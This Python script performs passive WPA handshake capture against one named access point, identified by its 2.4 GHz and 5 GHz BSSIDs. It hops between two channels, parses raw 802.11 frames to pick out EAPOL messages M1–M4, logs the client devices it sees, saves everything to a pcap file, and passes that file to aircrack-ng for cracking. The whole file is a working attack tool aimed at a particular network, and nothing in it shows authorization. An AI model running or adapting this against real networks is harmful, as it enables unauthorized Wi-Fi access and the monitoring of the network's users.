#!/usr/bin/env python3
"""
Long-running passive handshake capture for "不想上班" AP.
Monitors ch1 (2.4GHz) for EAPOL frames.
Dual-target: BSSID 04:67:61:D6:DC:92 (2.4G) and 04:67:61:D6:DC:93 (5G ch40)
Alternates channels to cover both bands.
"""
import socket, struct, time, subprocess, sys, os, signal

TARGETS = {
    bytes.fromhex("046761d6dc92"): {"name": "不想上班-2.4G", "ch": 1, "freq": 2412},
    bytes.fromhex("046761d6dc93"): {"name": "不想上班-5G",   "ch": 40, "freq": 5200},
}
PCAP_FILE = "/tmp/hs_bxsb.pcap"
CHANNEL_DWELL = 30  # seconds per channel
MAX_RUNTIME = 1800  # 30 minutes max

PCAP_HDR = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 127)

running = True
def sig_handler(sig, frame):
    global running
    running = False
signal.signal(signal.SIGINT, sig_handler)
signal.signal(signal.SIGTERM, sig_handler)

def run(cmd):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
    except subprocess.TimeoutExpired:
        return None

def is_eapol_frame(data, rt_len):
    if len(data) < rt_len + 30:
        return False
    fc = struct.unpack('<H', data[rt_len:rt_len+2])[0]
    ftype = (fc >> 2) & 3
    if ftype != 2:
        return False
    fsubtype = (fc >> 4) & 0xf
    to_ds = fc & 0x0100
    from_ds = fc & 0x0200
    hdr_len = 24
    if to_ds and from_ds:
        hdr_len = 30
    if fsubtype & 0x8:
        hdr_len += 2
    llc_start = rt_len + hdr_len
    if len(data) < llc_start + 8:
        return False
    if data[llc_start:llc_start+6] != b'\xaa\xaa\x03\x00\x00\x00':
        return False
    ethertype = struct.unpack('>H', data[llc_start+6:llc_start+8])[0]
    return ethertype == 0x888e

def get_msg_num(data, rt_len):
    fc = struct.unpack('<H', data[rt_len:rt_len+2])[0]
    fsubtype = (fc >> 4) & 0xf
    to_ds = fc & 0x0100
    from_ds = fc & 0x0200
    hdr_len = 24
    if to_ds and from_ds:
        hdr_len = 30
    if fsubtype & 0x8:
        hdr_len += 2
    eapol_start = rt_len + hdr_len + 8 + 4
    if len(data) < eapol_start + 3:
        return "?"
    key_info = struct.unpack('>H', data[eapol_start + 1:eapol_start + 3])[0]
    ack = (key_info >> 7) & 1
    mic = (key_info >> 8) & 1
    install = (key_info >> 6) & 1
    secure = (key_info >> 9) & 1
    if ack and not mic: return "M1"
    elif not ack and mic and not secure: return "M2"
    elif ack and mic and install: return "M3"
    elif not ack and mic and secure: return "M4"
    return f"KI=0x{key_info:04x}"

def is_from_target(data, rt_len):
    if len(data) < rt_len + 22:
        return None
    for off in [4, 10, 16]:
        addr = bytes(data[rt_len+off:rt_len+off+6])
        if addr in TARGETS:
            return addr
    return None

def main():
    global running

    channels = [(1, 2412), (40, 5200)]

    print(f"=== Passive Handshake Capture for 不想上班 ===")
    print(f"Targets: {', '.join(t['name'] for t in TARGETS.values())}")
    print(f"Alternating ch{channels[0][0]} / ch{channels[1][0]} every {CHANNEL_DWELL}s")
    print(f"Max runtime: {MAX_RUNTIME}s ({MAX_RUNTIME//60} min)")
    print(f"Output: {PCAP_FILE}")
    print(f"PID: {os.getpid()} (kill to stop)")
    print()

    pcap = open(PCAP_FILE, 'wb')
    pcap.write(PCAP_HDR)

    total = 0
    eapol_count = 0
    target_data = 0
    stations_seen = set()
    start = time.time()
    ch_idx = 0
    last_status = 0

    while running and (time.time() - start) < MAX_RUNTIME:
        ch, freq = channels[ch_idx % len(channels)]
        ch_idx += 1

        run(f"iw dev wlan0 set freq {freq}")
        print(f"[{time.strftime('%H:%M:%S')}] Monitoring ch{ch} ({freq}MHz)...")

        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.bind(("wlan0", 0))
            sock.settimeout(1.0)
        except Exception as e:
            print(f"  Socket error: {e}")
            time.sleep(1)
            continue

        ch_start = time.time()
        ch_pkts = 0

        while running and (time.time() - ch_start) < CHANNEL_DWELL:
            try:
                data = sock.recv(65535)
            except socket.timeout:
                now = time.time()
                if now - last_status >= 30:
                    elapsed = int(now - start)
                    print(f"  [{elapsed}s] Total: {total} pkts, {target_data} target, {eapol_count} EAPOL, stations: {len(stations_seen)}")
                    if stations_seen:
                        print(f"        Seen: {', '.join(s.hex(':') for s in stations_seen)}")
                    last_status = now
                continue

            total += 1
            ch_pkts += 1
            ts = time.time()

            if len(data) < 4:
                continue
            rt_len = struct.unpack('<H', data[2:4])[0]
            if rt_len >= len(data):
                continue

            # Write to pcap
            sec = int(ts)
            usec = int((ts - sec) * 1e6)
            pcap.write(struct.pack('<IIII', sec, usec, len(data), len(data)))
            pcap.write(data)

            target_bssid = is_from_target(data, rt_len)
            if not target_bssid:
                continue

            target_data += 1

            # Track stations
            fc = struct.unpack('<H', data[rt_len:rt_len+2])[0]
            ftype = (fc >> 2) & 3
            if ftype == 2 and len(data) >= rt_len + 22:
                for off in [4, 10]:
                    addr = bytes(data[rt_len+off:rt_len+off+6])
                    if addr not in TARGETS and addr != b'\xff\xff\xff\xff\xff\xff':
                        if addr not in stations_seen:
                            stations_seen.add(addr)
                            name = TARGETS[target_bssid]['name']
                            print(f"  *** New station: {addr.hex(':')} on {name} ***")

            # Check EAPOL
            if is_eapol_frame(data, rt_len):
                eapol_count += 1
                msg = get_msg_num(data, rt_len)
                sa = data[rt_len+10:rt_len+16].hex(':')
                da = data[rt_len+4:rt_len+10].hex(':')
                name = TARGETS[target_bssid]['name']
                elapsed = time.time() - start
                print(f"  *** EAPOL {msg} on {name}: {sa} -> {da} (+{elapsed:.0f}s) ***")
                pcap.flush()

                if eapol_count >= 4:
                    print(f"\n  *** Complete handshake! ***")
                    running = False
                    break

        sock.close()

    pcap.close()
    elapsed = int(time.time() - start)
    print(f"\n{'='*50}")
    print(f"Runtime: {elapsed}s")
    print(f"Total: {total} pkts, {target_data} target, {eapol_count} EAPOL")
    print(f"Stations seen: {len(stations_seen)}")
    for s in stations_seen:
        print(f"  {s.hex(':')}")
    print(f"PCAP: {PCAP_FILE}")

    if eapol_count > 0:
        print("\nVerifying with aircrack-ng...")
        result = run(f"aircrack-ng {PCAP_FILE}")
        if result and result.stdout:
            print(result.stdout[:500])

    return 0 if eapol_count >= 2 else 1

if __name__ == "__main__":
    sys.exit(main())
